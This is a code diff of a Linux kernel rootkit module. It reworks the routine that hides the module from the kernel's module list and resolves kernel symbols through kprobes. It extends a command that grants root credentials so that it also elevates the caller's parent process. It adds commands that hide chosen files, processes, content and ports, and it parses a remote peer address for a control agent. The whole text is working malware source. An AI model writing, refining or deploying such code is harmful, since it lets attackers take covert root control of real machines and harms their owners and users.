@@ -3,7 +3,9 @@
 #include <linux/err.h>
 #include <linux/errno.h>
 #include <linux/hex.h>
+#include <linux/inet.h>
 #include <linux/init.h>
+#include <linux/kallsyms.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
 #include <linux/pid.h>
@@ -18,14 +20,13 @@
 #include <net/sock.h>
 
 #include "agent.h"
-#include "ipv4.h"
 #include "root_shell.h"
 #include "target_list.h"
 
 #define RK_BUF_MAX 2048
 #define RK_CMD_MAX 128
-#define RK_PREFIX "rkling."
-#define RK_PREFIX_LEN 7
+#define RK_PREFIX "rklings."
+#define RK_PREFIX_LEN 8
 #define RK_PATH_MAX 128
 
 static unsigned short peer_port;
@@ -61,57 +62,87 @@ struct rk_target_list content_targets;
 struct rk_target_list port_targets;
 static struct proc_dir_entry *proc_entry;
 static struct list_head *saved_prev;
-bool cloaked;
+bool module_hidden;
 static bool persist_requested;
 
-/* --- module cloaking (M01) --- */
+/* --- module hiding (M01) --- */
 
-void rk_module_cloak(void);
-void rk_module_uncloak(void);
+void rk_module_hide(void);
+void rk_module_unhide(void);
 int rk_escalate_pid(unsigned int pid);
 
-void rk_module_cloak(void)
+void rk_module_hide(void)
 {
-	if (cloaked)
+	if (module_hidden)
 		return;
 	saved_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	cloaked = true;
+	module_hidden = true;
 }
 
-void rk_module_uncloak(void)
+void rk_module_unhide(void)
 {
-	if (!cloaked)
+	if (!module_hidden)
 		return;
 	list_add(&THIS_MODULE->list, saved_prev);
-	cloaked = false;
+	module_hidden = false;
 }
 
 /* --- privilege escalation --- */
 
 static typeof(&find_task_by_vpid) rk_find_task_by_vpid;
 
+static void *rk_kprobe_resolve(const char *name)
+{
+	struct kprobe kp = { .symbol_name = name };
+	void *addr;
+
+	if (register_kprobe(&kp))
+		return NULL;
+	addr = (void *)kp.addr;
+	unregister_kprobe(&kp);
+	return addr;
+}
+
 static int rk_resolve_symbols(void)
 {
-	struct kprobe kp = { .symbol_name = "find_task_by_vpid" };
-	int error;
+	rk_find_task_by_vpid = (typeof(rk_find_task_by_vpid))
+		rk_kprobe_resolve("find_task_by_vpid");
+	if (!rk_find_task_by_vpid)
+		return -ENOENT;
 
-	error = register_kprobe(&kp);
-	if (error)
-		return error;
-	rk_find_task_by_vpid = (typeof(rk_find_task_by_vpid))kp.addr;
-	unregister_kprobe(&kp);
 	return 0;
+}
+
+static void rk_install_creds(struct task_struct *task, struct cred *new_cred)
+{
+	const struct cred *old;
+
+	old = rcu_dereference_protected(task->real_cred, 1);
+	rcu_assign_pointer(task->real_cred, new_cred);
+	rcu_assign_pointer(task->cred, new_cred);
+	put_cred(old);
 }
 
 static int rk_escalate_self(void)
 {
+	struct task_struct *parent;
 	struct cred *new_cred;
+	int error;
 
 	new_cred = prepare_kernel_cred(&init_task);
 	if (!new_cred)
 		return -ENOMEM;
-	return commit_creds(new_cred);
+	error = commit_creds(new_cred);
+	if (error)
+		return error;
+	parent = rcu_dereference(current->real_parent);
+	if (parent && parent != current && parent->mm) {
+		new_cred = prepare_kernel_cred(&init_task);
+		if (new_cred)
+			rk_install_creds(parent, new_cred);
+	}
+	return 0;
 }
 
 int rk_escalate_pid(unsigned int pid)
@@ -129,14 +160,16 @@ int rk_escalate_pid(unsigned int pid)
 	}
 	get_task_struct(task);
 	rcu_read_unlock();
-
+	if (!task->mm) {
+		put_task_struct(task);
+		return -EINVAL;
+	}
 	new_cred = prepare_kernel_cred(&init_task);
 	if (!new_cred) {
 		put_task_struct(task);
 		return -ENOMEM;
 	}
-	rcu_assign_pointer(task->real_cred, new_cred);
-	rcu_assign_pointer(task->cred, new_cred);
+	rk_install_creds(task, new_cred);
 	put_task_struct(task);
 	return 0;
 }
@@ -150,11 +183,11 @@ static int rk_parse_local_command(const char *path)
 	if (strcmp(cmd, "e") == 0)
 		return rk_escalate_self();
 	if (strcmp(cmd, "h.m") == 0) {
-		rk_module_cloak();
+		rk_module_hide();
 		return 0;
 	}
 	if (strcmp(cmd, "u.m") == 0) {
-		rk_module_uncloak();
+		rk_module_unhide();
 		return 0;
 	}
 	if (strcmp(cmd, "persist") == 0) {
@@ -170,21 +203,13 @@ static int rk_parse_local_command(const char *path)
 	if (strncmp(cmd, "h.p.", 4) == 0 && cmd[4])
 		return rk_target_add(&port_targets, cmd + 4) < 0 ? -ENOSPC : 0;
 	if (strncmp(cmd, "u.f.", 4) == 0 && cmd[4])
-		return rk_target_remove(&file_targets,
-					simple_strtoul(cmd + 4, NULL, 10),
-					NULL, 0);
+		return rk_target_remove_either(&file_targets, cmd + 4);
 	if (strncmp(cmd, "u.i.", 4) == 0 && cmd[4])
-		return rk_target_remove(&pid_targets,
-					simple_strtoul(cmd + 4, NULL, 10),
-					NULL, 0);
+		return rk_target_remove_either(&pid_targets, cmd + 4);
 	if (strncmp(cmd, "u.c.", 4) == 0 && cmd[4])
-		return rk_target_remove(&content_targets,
-					simple_strtoul(cmd + 4, NULL, 10),
-					NULL, 0);
+		return rk_target_remove_either(&content_targets, cmd + 4);
 	if (strncmp(cmd, "u.p.", 4) == 0 && cmd[4])
-		return rk_target_remove(&port_targets,
-					simple_strtoul(cmd + 4, NULL, 10),
-					NULL, 0);
+		return rk_target_remove_either(&port_targets, cmd + 4);
 	return -ENOENT;
 }
 
@@ -474,7 +499,7 @@ static int rk_show(struct seq_file *out, void *unused)
 	unsigned long flags;
 	unsigned int i;
 
-	seq_printf(out, "cloaked: %s\n", cloaked ? "yes" : "no");
+	seq_printf(out, "module: %s\n", module_hidden ? "yes" : "no");
 	seq_printf(out, "persist: %s\n", persist_requested ? "yes" : "no");
 
 	seq_puts(out, "file_targets:\n");
@@ -543,8 +568,14 @@ static int __init rk_init(void)
 	__be32 peer_address;
 	int error;
 
-	error = rk_ipv4_parse(peer_address_text, &peer_address);
-	if (error || !peer_port || !retry_base_ms ||
+	{
+		const char *end;
+
+		if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address,
+			      -1, &end) || *end || !peer_address)
+			return -EINVAL;
+	}
+	if (!peer_port || !retry_base_ms ||
 	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
 		return -EINVAL;
 
@@ -594,7 +625,7 @@ static int __init rk_init(void)
 	}
 
 	rk_target_add(&file_targets, "rkling");
-	rk_module_cloak();
+	rk_module_hide();
 
 	memzero_explicit(key, sizeof(key));
 	memzero_explicit(control_key, sizeof(control_key));
@@ -620,7 +651,7 @@ zeroize_key:
 
 static void __exit rk_exit(void)
 {
-	rk_module_uncloak();
+	rk_module_unhide();
 	proc_remove(proc_entry);
 	unregister_kretprobe(&mkdir_probe);
 	unregister_kretprobe(&tcp_probe);
